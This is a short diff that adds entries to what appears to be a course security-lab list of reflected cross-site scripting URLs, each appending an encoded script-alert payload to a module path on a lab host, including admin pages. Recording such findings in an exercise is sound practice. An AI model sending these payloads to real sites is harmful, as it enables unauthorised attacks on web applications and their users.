@@ -10,6 +10,10 @@ http://the-intruders.csec.chatzi.org/modules/auth/opencourses.php/%22%22%3E%3Csc
 http://the-intruders.csec.chatzi.org/modules/search/search.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
 http://the-intruders.csec.chatzi.org/modules/dropbox/index.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
 http://the-intruders.csec.chatzi.org/modules/wiki/wiki.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+http://the-intruders.csec.chatzi.org/modules/link/link.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+
+
+http://the-intruders.csec.chatzi.org/modules/forum_admin/forum_admin.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
 
 admin:
 http://the-intruders.csec.chatzi.org/modules/admin/index.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E
